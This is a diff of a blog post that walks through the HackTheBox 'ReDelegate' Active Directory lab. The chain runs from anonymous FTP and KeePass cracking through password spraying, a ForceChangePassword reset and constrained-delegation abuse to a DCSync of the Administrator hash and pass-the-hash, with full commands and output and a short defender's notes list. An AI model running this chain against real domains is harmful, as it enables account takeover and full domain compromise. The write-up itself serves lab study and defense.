@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>HackTheBox: ReDelegate — Satej Chaudhari</title>
-  <meta name="description" content="HackTheBox ReDelegate walkthrough — anonymous FTP yields a KeePass database cracked with a hint-built wordlist, secrets spray into MSSQL and AD, a ForceChangePassword ACL takes over a user, and SeEnableDelegationPrivilege plus GenericAll on a computer is abused for constrained delegation with protocol transition to DCSync the domain.">
+  <meta name="description" content="In-depth HackTheBox ReDelegate walkthrough — anonymous FTP, a KeePass crack from a password-policy hint, MSSQL and AD spraying, ForceChangePassword, then constrained delegation with protocol transition and DCSync, fully explained.">
 
   <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
 
@@ -61,127 +61,171 @@
         <h1 class="post-title">HackTheBox: ReDelegate</h1>
         <p class="post-meta">
           <time datetime="2026-10-02">2026-10-02</time>
-          <span>&middot; 12 min read</span>
+          <span>&middot; 16 min read</span>
         </p>
       </header>
 
       <div class="post-body">
 
-        <p><strong>ReDelegate</strong> is an Active Directory box (<code>redelegate.vl</code>). Anonymous FTP yields a KeePass database cracked with a hint-built wordlist, those secrets spray into MSSQL and then AD, a ForceChangePassword ACL takes over a user, and that user's <code>SeEnableDelegationPrivilege</code> plus GenericAll over a computer is abused for constrained delegation with protocol transition — ending in a DCSync of the Administrator hash.</p>
+        <p><strong>ReDelegate</strong> is an Active Directory box whose finale is the technique in its name: constrained delegation with protocol transition. Getting there runs through anonymous FTP, a KeePass database cracked with a wordlist we build from a training-document hint, a credential that sprays into MSSQL and then AD, and a <a href="../theory/2026-08-18-acls-dacls.html">ForceChangePassword</a> ACL. The key that unlocks the domain is a single privilege on one user: <code>SeEnableDelegationPrivilege</code>.</p>
+
+        <h2>Attack chain at a glance</h2>
+
+        <ul>
+          <li><strong>Recon</strong> — anonymous FTP, MSSQL 2019, and a full DC port set on <code>redelegate.vl</code>.</li>
+          <li><strong>Loot</strong> — FTP holds a <code>Shared.kdbx</code> KeePass DB and a training doc hinting the password scheme is <code>SeasonYear!</code>.</li>
+          <li><strong>Crack</strong> — a seasonal wordlist cracks the KeePass master password (<code>Fall2024!</code>); its entries become a spray list.</li>
+          <li><strong>Foothold</strong> — one secret logs into MSSQL (local auth); login enumeration + spraying lands domain user <code>Marie.Curie</code>.</li>
+          <li><strong>User</strong> — Marie.Curie has <a href="../theory/2026-08-18-acls-dacls.html">ForceChangePassword</a> over <code>helen.frost</code>; reset it, WinRM in, user flag.</li>
+          <li><strong>Root</strong> — helen.frost holds <code>SeEnableDelegationPrivilege</code> and GenericAll over computer <code>FS01$</code>; configure <a href="../theory/2026-08-18-delegation.html">constrained delegation with protocol transition</a>, S4U-impersonate the DC, <a href="../theory/2026-08-18-dcsync.html">DCSync</a> the Administrator hash, pass-the-hash in.</li>
+        </ul>
 
         <h2>Reconnaissance</h2>
 
-        <pre><code>nmap -Pn -p- -sC -sV 10.129.11.197
+        <pre><code>ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.129.11.197 | grep ^[0-9] | cut -d / -f1 | paste -sd,)
+nmap -Pn -p$ports -sC -sV 10.129.11.197
 
-21/tcp   ftp           Microsoft ftpd  (Anonymous FTP allowed)
+21/tcp   ftp           Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|   CyberAudit.txt   Shared.kdbx   TrainingAgenda.txt
 88/tcp   kerberos-sec
-389/tcp  ldap          redelegate.vl, dc.redelegate.vl
+389/tcp  ldap          Domain: redelegate.vl, dc.redelegate.vl
 1433/tcp ms-sql-s      Microsoft SQL Server 2019
 5985/tcp http          WinRM</code></pre>
 
-        <h2>Anonymous FTP &amp; a hint-built wordlist</h2>
+        <h2>Anonymous FTP and a password-policy hint</h2>
 
-        <p>Anonymous FTP holds three files:</p>
+        <p>Anonymous FTP is open and holds three files. One is a KeePass database (encrypted secrets) and one is a staff training agenda — and the agenda is where the box practically tells you the password scheme:</p>
 
         <pre><code>ftp anonymous@10.129.11.197
-  CyberAudit.txt   Shared.kdbx   TrainingAgenda.txt</code></pre>
+ftp&gt; binary          # IMPORTANT: .kdbx is binary; ASCII mode corrupts it
+ftp&gt; get Shared.kdbx
+ftp&gt; get TrainingAgenda.txt
 
-        <p>The training agenda drops a strong hint about the password policy:</p>
+$ cat TrainingAgenda.txt
+... &quot;Weak Passwords&quot; - Why &quot;SeasonYear!&quot; is not a good password ...</code></pre>
 
-        <pre><code>&quot;Weak Passwords&quot; - Why &quot;SeasonYear!&quot; is not a good password</code></pre>
+        <p>&ldquo;SeasonYear!&rdquo; is a template. Expand it into the handful of recent season-year combinations — a tiny, targeted wordlist that beats rockyou here because the policy is so specific:</p>
 
-        <p>That yields a small seasonal wordlist. (Re-fetch the KeePass file in <code>binary</code> mode — ASCII mode corrupts it.)</p>
-
-        <pre><code>Spring2024!
+        <pre><code>cat wordlist.txt
+Spring2024!
 Summer2024!
 Autumn2024!
 Fall2024!
 Winter2024!</code></pre>
 
-        <h2>Cracking the KeePass database</h2>
+        <h2>Cracking KeePass and harvesting secrets</h2>
+
+        <p>Convert the database to a John-crackable hash and run the seasonal list against it — KeePass uses a deliberately slow KDF (600k iterations here), so a small, correct wordlist matters:</p>
 
         <pre><code>python keepass2john.py Shared.kdbx &gt; Shared.hash
 john --wordlist=wordlist.txt Shared.hash
-Fall2024!   (Shared)</code></pre>
+Fall2024!   (Shared)
+1g 0:00:00:00 DONE</code></pre>
 
-        <p>Opening the database in KeePassXC with <code>Fall2024!</code> reveals a set of stored secrets, all added to the wordlist for spraying.</p>
+        <p>Open the database in KeePassXC with <code>Fall2024!</code>. Each stored entry's password is another candidate credential — dump them all into the spray list alongside the seasonal ones:</p>
 
         <figure>
-          <img src="../assets/img/htb-redelegate/img1.png" alt="The unlocked KeePass database in KeePassXC">
-          <figcaption>The KeePass entries, unlocked — more passwords to spray.</figcaption>
+          <img src="../assets/img/htb-redelegate/img1.png" alt="The unlocked KeePass database open in KeePassXC">
+          <figcaption>KeePassXC opened with the cracked master password — every entry is a credential to spray.</figcaption>
         </figure>
 
-        <h2>MSSQL → AD foothold</h2>
+        <pre><code># wordlist.txt now also contains the KeePass entry passwords, e.g.
+#   zDPBpaF4FywlqIv11vii, Spdv41gg4BlBgSYIW1gF, cn4KOEgsHqvKXPjEnSD9, ...</code></pre>
 
-        <p>Only one secret authenticates — to MSSQL, as a local login:</p>
+        <h2>MSSQL foothold and user discovery</h2>
+
+        <p>Spraying the secrets, only one authenticates — and it is a local SQL login, not a domain account:</p>
 
         <pre><code>netexec mssql 10.129.11.197 -u SQLGuest -p zDPBpaF4FywlqIv11vii --local-auth
-[+] DC\SQLGuest:zDPBpaF4FywlqIv11vii</code></pre>
+MSSQL  10.129.11.197  1433  DC  [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii</code></pre>
 
-        <p>Enumerating SQL logins (via Metasploit's <code>mssql_enum_sql_logins</code>) expands the user list, and re-spraying the cracked passwords across AD lands a domain user:</p>
+        <p>A SQL login is not yet a Windows user, but the server will happily list its logins, which seeds an AD user list. Metasploit's <code>mssql_enum_sql_logins</code> does the enumeration (netexec was flaky here):</p>
+
+        <pre><code>msf6 auxiliary(admin/mssql/mssql_enum_sql_logins) &gt; run
+[+] 17 SQL Server logins were verified:
+   ... SQLGuest, sa, WIN-...\Administrator, BUILTIN\Users, NT AUTHORITY\SYSTEM ...</code></pre>
+
+        <p>Re-spraying the cracked passwords across the discovered/AD users lands a real domain account, which is enough to run BloodHound:</p>
 
         <pre><code>bloodhound-python -u Marie.Curie -p &#x27;Fall2024!&#x27; -d redelegate.vl -ns 10.129.11.197 -c ALL --zip</code></pre>
 
         <figure>
-          <img src="../assets/img/htb-redelegate/img2.png" alt="BloodHound showing Marie.Curie&#x27;s ForceChangePassword over helen.frost">
-          <figcaption>BloodHound: <code>Marie.Curie</code> can force-change <code>helen.frost</code>'s password.</figcaption>
+          <img src="../assets/img/htb-redelegate/img2.png" alt="BloodHound showing Marie.Curie&#x27;s ForceChangePassword edge to helen.frost">
+          <figcaption>BloodHound: <code>Marie.Curie</code> holds ForceChangePassword over <code>helen.frost</code>.</figcaption>
         </figure>
 
-        <h2>ForceChangePassword → user flag</h2>
+        <h2>User flag — ForceChangePassword</h2>
 
-        <p>Marie.Curie holds ForceChangePassword over <code>helen.frost</code>; reset it, grab a ticket, and WinRM in:</p>
+        <p>ForceChangePassword lets you set a target's password without knowing the old one — a common and devastating <a href="../theory/2026-08-18-acls-dacls.html">ACL</a> misconfiguration. Reset helen.frost, grab a Kerberos TGT for her, and WinRM in with the ticket:</p>
 
         <pre><code>bloodyAD -d redelegate.vl -u marie.curie -p Fall2024! --dc-ip 10.129.234.50 \
   set password helen.frost &#x27;Password@1&#x27;
-impacket-getTGT -k redelegate.vl/helen.frost:&#x27;Password@1&#x27;
-KRB5CCNAME=helen.frost.ccache evil-winrm -r redelegate.vl -i dc.redelegate.vl</code></pre>
+[+] Password changed successfully!
 
-        <p><code>helen.frost</code> has the user flag — and a very interesting privilege:</p>
+impacket-getTGT -k redelegate.vl/helen.frost:&#x27;Password@1&#x27;
+KRB5CCNAME=helen.frost.ccache evil-winrm -r redelegate.vl -i dc.redelegate.vl
+*Evil-WinRM* PS C:\Users\Helen.Frost\Desktop&gt; type user.txt</code></pre>
+
+        <p>What makes helen.frost special is not the flag but her token:</p>
 
         <pre><code>whoami /priv
-SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation   Enabled
-SeMachineAccountPrivilege     Add workstations to domain                                      Enabled</code></pre>
+SeMachineAccountPrivilege     Add workstations to domain                                      Enabled
+SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation   Enabled</code></pre>
 
         <figure>
-          <img src="../assets/img/htb-redelegate/img3.png" alt="PowerView/BloodHound enumeration of the delegation rights">
-          <figcaption>Enumerating the delegation rights available to <code>helen.frost</code>.</figcaption>
+          <img src="../assets/img/htb-redelegate/img3.png" alt="Enumerating helen.frost&#x27;s delegation-related rights">
+          <figcaption>Enumerating helen.frost's rights — <code>SeEnableDelegationPrivilege</code> plus control over a computer object.</figcaption>
         </figure>
 
-        <h2>Constrained delegation → Domain Admin</h2>
+        <h2>Root — constrained delegation with protocol transition</h2>
 
-        <p>helen.frost has GenericAll over the computer <code>FS01$</code>. Take ownership, reset its password, and flag it for protocol-transition delegation:</p>
+        <p>BloodHound also shows helen.frost has GenericAll over the computer account <code>FS01$</code>. The plan: make <code>FS01$</code> a constrained-delegation principal that is allowed to impersonate anyone to the DC's CIFS service, then use it to pull a privileged ticket. First take ownership of <code>FS01$</code>, reset its password (so we can authenticate as it), and set the protocol-transition flag:</p>
 
         <pre><code>bloodyAD ... set owner &#x27;FS01$&#x27; helen.frost
 bloodyAD ... set password &#x27;FS01$&#x27; &#x27;Password@1&#x27;
-bloodyAD ... add uac FS01$ -f TRUSTED_TO_AUTH_FOR_DELEGATION</code></pre>
+bloodyAD -d redelegate.vl -u helen.frost -p &#x27;Password@1&#x27; --dc-ip 10.129.234.50 \
+  add uac FS01$ -f TRUSTED_TO_AUTH_FOR_DELEGATION</code></pre>
 
-        <blockquote><code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> enables protocol transition (S4U2self), so <code>FS01$</code> can request a service ticket as any user without their password; <code>msDS-AllowedToDelegateTo = cifs/dc.redelegate.vl</code> then says it may delegate to the DC's CIFS service. Setting that attribute is only permitted because helen.frost holds <code>SeEnableDelegationPrivilege</code> — that privilege is the linchpin of the whole box. No shares are touched; <code>cifs/</code> is just one SPN the DC registers (<code>ldap/</code> works too).</blockquote>
+        <blockquote>Two attributes do the work. <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> enables <strong>protocol transition</strong> (S4U2self): <code>FS01$</code> can request a service ticket <em>as any user</em> without that user's password. <code>msDS-AllowedToDelegateTo = cifs/dc.redelegate.vl</code> then says it may forward that identity to the DC's CIFS service (S4U2proxy). Setting <code>msDS-AllowedToDelegateTo</code> is privileged — only allowed because helen.frost holds <code>SeEnableDelegationPrivilege</code>. That privilege is the whole box. <code>cifs/</code> is just one SPN the DC auto-registers; <code>ldap/</code> works too and some writeups use it. See <a href="../theory/2026-08-18-delegation.html">Kerberos Delegation</a>.</blockquote>
 
         <pre><code>impacket-getTGT -k redelegate.vl/helen.frost:&#x27;Password@1&#x27;
 export KRB5CCNAME=helen.frost.ccache
 bloodyAD -d redelegate.vl -k --host dc.redelegate.vl \
-  set object FS01$ msDS-AllowedToDelegateTo -v cifs/dc.redelegate.vl</code></pre>
+  set object FS01$ msDS-AllowedToDelegateTo -v cifs/dc.redelegate.vl
+[+] FS01$&#x27;s msDS-AllowedToDelegateTo has been updated</code></pre>
 
-        <p>Now request a ticket to the DC's CIFS service while impersonating the <code>dc</code> account (S4U2self + S4U2proxy):</p>
+        <p>Now authenticate as <code>FS01$</code> and request a ticket to <code>cifs/dc.redelegate.vl</code> while impersonating the <code>dc</code> machine account (S4U2self then S4U2proxy):</p>
 
         <pre><code>impacket-getST -k -no-pass -spn cifs/dc.redelegate.vl -impersonate dc redelegate.vl/FS01$
+[*] Impersonating dc
 [*] Requesting S4U2self
 [*] Requesting S4U2Proxy
 [*] Saving ticket in dc@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache</code></pre>
 
         <figure>
-          <img src="../assets/img/htb-redelegate/img4.png" alt="Setting the TRUSTED_TO_AUTH_FOR_DELEGATION flag on FS01$">
-          <figcaption><code>FS01$</code> flagged <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>.</figcaption>
+          <img src="../assets/img/htb-redelegate/img4.png" alt="Setting TRUSTED_TO_AUTH_FOR_DELEGATION on the FS01$ computer account">
+          <figcaption><code>FS01$</code> flagged <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> — protocol transition enabled.</figcaption>
         </figure>
 
-        <p>That CIFS ticket to the DC is enough to dump the Administrator hash, then pass-the-hash in:</p>
+        <p>Holding a CIFS ticket to the DC as a machine account is enough to run the directory-replication (DCSync) protocol and pull the Administrator hash — then <a href="../theory/2026-08-18-ntlm.html">pass the hash</a> straight into a WinRM shell:</p>
 
         <pre><code>export KRB5CCNAME=dc@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
 impacket-secretsdump -k -no-pass dc.redelegate.vl -just-dc-user Administrator
-Administrator:500:aad3b435...:ec17f7a2a4d96e177bfd101b94ffc0a7:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
 
 evil-winrm -i dc.redelegate.vl -u Administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7
 *Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt</code></pre>
+
+        <h2>Defender's notes</h2>
+
+        <ul>
+          <li>Disable anonymous FTP, and never leave credential stores (KeePass DBs, config) on open shares.</li>
+          <li>Ban scheme-based passwords like <code>Season+Year!</code> — they collapse the keyspace to a handful of guesses.</li>
+          <li>Grant <code>SeEnableDelegationPrivilege</code> to nobody but tightly controlled admins; it is what lets delegation be <em>configured</em>, and it gated this entire compromise.</li>
+          <li>Audit <code>msDS-AllowedToDelegateTo</code> and <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>; treat protocol-transition delegation to a DC service as critical (<a href="../theory/2026-08-18-delegation.html">Delegation</a>).</li>
+          <li>Review dangerous ACLs (ForceChangePassword, GenericAll over computers) continuously, not once.</li>
+        </ul>
 
       </div>
     </article>
